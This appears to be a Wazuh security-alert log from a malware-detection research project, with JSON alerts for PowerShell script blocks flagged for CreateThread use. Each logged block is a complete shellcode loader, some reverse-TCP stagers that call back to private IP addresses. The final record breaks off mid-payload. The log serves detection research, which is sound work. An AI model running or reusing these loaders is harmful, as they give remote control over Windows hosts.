{"timestamp":"2026-07-14T07:53:58.011+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":37,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015638.619592","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:27.6279832Z","eventRecordID":"200950","processID":"3008","threadID":"11332","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x19,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: a86bd663-b223-4e4e-86a5-260ef40f2c68\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1622.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x19,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"a86bd663-b223-4e4e-86a5-260ef40f2c68","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1622.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:01.659+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":38,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015641.631402","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:31.1489654Z","eventRecordID":"200960","processID":"7776","threadID":"3088","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$L8Q = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $L8Q -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x20,0x9b,0xa4,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0x49,0xc2,0x6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0x7e,0x0c,0x3e,0x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x99,0xa3,0xb9,0xf3,0xb2,0x90,0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0x66,0xcd,0x5f,0x0e,0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0xe4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,0x6b,0x5e,0x0b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0x4d,0xad,0x09,0x37,0xc6,0x50,0xde,0xbe,0x9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x27,0xbb,0x2a,0x96,0x8d,0xb7,0xc6,0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0xcc,0x79,0x98,0x06,0x33,0x50,0x5c,0x98,0xca,0x5b,0x9d,0xb0,0x08,0x0f,0xcd,0xaa,0xb9,0x30,0x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0xe1,0x01,0xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d,0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,0xb4,0x85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0xd3,0x6e,0x67,0xf9,0x23,0x39,0xed,0xf9,0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ktN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ktN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ktN,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 21974069-87ca-40ed-8582-b3bab4844bd7\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1678.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$L8Q = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $L8Q -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x46,0x20,0x9b,0xa4,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xc2,0x04,0x03,0x42,0x49,0xc2,0x6e,0x58,0xbd,0x80,0x91,0xa1,0x3d,0xe5,0x18,0x44,0x0c,0x25,0x7e,0x0c,0x3e,0x95,0xf4,0x40,0xb2,0x5e,0x58,0x71,0x41,0x12,0x75,0x76,0xe2,0x99,0xa3,0xb9,0xf3,0xb2,0x90,0xd8,0x77,0xc9,0xc4,0x3a,0x46,0x02,0x19,0x3a,0x8f,0x7f,0xd0,0x6e,0x58,0x0b,0x47,0x9f,0xed,0x41,0x54,0x14,0xbd,0x44,0xdc,0xc9,0x75,0x66,0xcd,0x5f,0x0e,0x31,0xcd,0x5e,0xc3,0x49,0x44,0x79,0x00,0x77,0x1e,0xf2,0xf2,0x03,0xa1,0xd2,0xcb,0xec,0x0e,0x1b,0xe4,0x1e,0x4e,0x5b,0xc2,0xc0,0x25,0x95,0x31,0x7c,0x3e,0x62,0x48,0x5a,0xcb,0x71,0xea,0x29,0x6b,0x5e,0x0b,0xfd,0xea,0x15,0x07,0x4a,0x78,0x71,0x0b,0x4d,0xad,0x09,0x37,0xc6,0x50,0xde,0xbe,0x9c,0x76,0xfa,0x9b,0x47,0x16,0x5b,0x41,0x29,0x27,0xbb,0x2a,0x96,0x8d,0xb7,0xc6,0xc3,0xbf,0x95,0x8e,0x20,0xf2,0x25,0x4e,0x2f,0x85,0x56,0x7c,0xf0,0x3d,0xf1,0xcc,0x79,0x98,0x06,0x33,0x50,0x5c,0x98,0xca,0x5b,0x9d,0xb0,0x08,0x0f,0xcd,0xaa,0xb9,0x30,0x86,0x2a,0x46,0xe5,0x33,0x2e,0xd0,0x9c,0xa5,0x0a,0x29,0xc9,0x27,0x6b,0x38,0x55,0xa1,0x8d,0x6a,0x35,0xe1,0x01,0xca,0xe5,0x41,0xf2,0xa2,0xef,0x4d,0x2d,0xd2,0x0f,0x84,0x46,0x78,0xe0,0x71,0x3e,0x14,0x99,0xdb,0xb4,0x85,0x66,0xf6,0xb0,0x85,0xed,0xf5,0x45,0x4b,0x06,0x73,0x56,0x3b,0xe6,0xce,0x04,0xed,0xf9,0xe4,0x23,0x11,0x6c,0x03,0xe2,0x46,0x18,0x09,0xd3,0xa0,0x87,0xf2,0x36,0xbb,0x0e,0x67,0xf9,0xd3,0x6e,0x67,0xf9,0x23,0x39,0xed,0xf9,0x4b,0x9d,0x55,0xaa,0x6e,0xe2,0x43,0xde,0x23,0x77,0x6c,0xb7,0x90,0xd0,0x04,0x35,0xcf,0x17,0x8b,0xc6,0x3a,0xa6,0xf7,0x10,0x02,0xdc,0x19,0xa1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ktN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ktN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ktN,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"21974069-87ca-40ed-8582-b3bab4844bd7","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1678.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:01.724+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":39,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015641.642750","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:32.0313368Z","eventRecordID":"200964","processID":"9952","threadID":"10752","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x53,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: fd0e3cf3-570a-48f7-9203-55d4fc9b7409\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1681.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x53,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"fd0e3cf3-570a-48f7-9203-55d4fc9b7409","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1681.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:54:03.149+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":40,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015643.653700","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:54:32.8880687Z","eventRecordID":"200968","processID":"6636","threadID":"3208","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Yiu = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Yiu -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x4d,0x4b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0